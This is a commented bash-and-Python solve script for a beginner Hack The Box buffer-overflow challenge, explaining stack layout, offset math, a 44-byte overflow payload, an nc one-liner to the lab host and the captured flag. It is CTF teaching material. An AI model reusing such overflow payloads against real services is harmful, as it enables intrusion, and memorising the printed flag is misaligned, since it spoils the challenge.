#!/usr/bin/env bash

set -euo pipefail

# Challenge: GettingStarted
# Platform: Hack The Box - CTF Try Out
# Category: Pwn / Binary Exploitation
#
# Scenario summary:
# This is a beginner stack-overflow challenge. The binary prints the stack
# layout for us, then asks for input. Our job is not to fully hijack control
# flow yet. We only need to overflow a stack buffer far enough to corrupt a
# nearby variable named "target".
#
# Real-world concept:
# In unsafe native code, data placed next to a buffer on the stack can be
# changed if input is copied without proper bounds checking. Even when we do
# not control RIP yet, changing a security-relevant variable can still be
# enough to win. This is the same mindset used in many real exploits:
# attackers first look for the *smallest useful corruption* before going for
# full code execution.
#
# Provided files:
#   - pwn_getting_started.zip
#   - challenge/gs
#   - challenge/wrapper.py
#   - challenge/glibc/libc.so.6
#   - challenge/glibc/ld-linux-x86-64.so.2
#
# Remote target used during solve:
#   - 154.57.164.67:31260
#
# Important observation from reversing:
#   main() allocates 0x30 bytes on the stack and lays out local data as:
#     buffer[32]  at rbp-0x30
#     alignment   at rbp-0x10
#     target      at rbp-0x08
#
# The code initializes target to 0xdeadbeef and later does:
#     if (target != 0xdeadbeef) { win(); }
#
# That means the easiest exploit is:
#   1. Fill the 32-byte buffer
#   2. Overwrite the 8-byte alignment dummy
#   3. Continue into target so it is no longer 0xdeadbeef
#
# Offset math:
#   32 bytes buffer
# + 8 bytes alignment
# = 40 bytes to reach target
#
# We send 44 'A' bytes.
# Why 44?
#   - bytes 0..31 fill the buffer
#   - bytes 32..39 overwrite alignment
#   - bytes 40..43 overwrite the low 4 bytes of target with 0x41414141
#   - the trailing NUL written by scanf lands inside the target field, which is
#     still fine because the value is no longer 0xdeadbeef
#
# Manual reproduction idea:
#   python3 -c 'print("A"*44)' | nc 154.57.164.67 31260
#
# Final live flag obtained during testing:
#   HTB{b0f_tut0r14l5_4r3_g00d}

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOST="${1:-154.57.164.67}"
PORT="${2:-31260}"

python3 - "$HOST" "$PORT" <<'PY'
import re
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])

# This is the entire exploit payload:
# 32 bytes to fill the buffer
#  8 bytes to overwrite the alignment slot
#  4 more bytes to corrupt target
payload = b"A" * 44 + b"\n"

with socket.create_connection((host, port), timeout=5) as s:
    s.sendall(payload)
    s.settimeout(3)
    chunks = []
    while True:
        try:
            data = s.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)

output = b"".join(chunks).decode("latin-1", errors="ignore")
match = re.search(r"HTB\{[^}]+\}", output)

if not match:
    print(output)
    raise SystemExit("[-] Flag not found in response.")

print(match.group(0))
PY
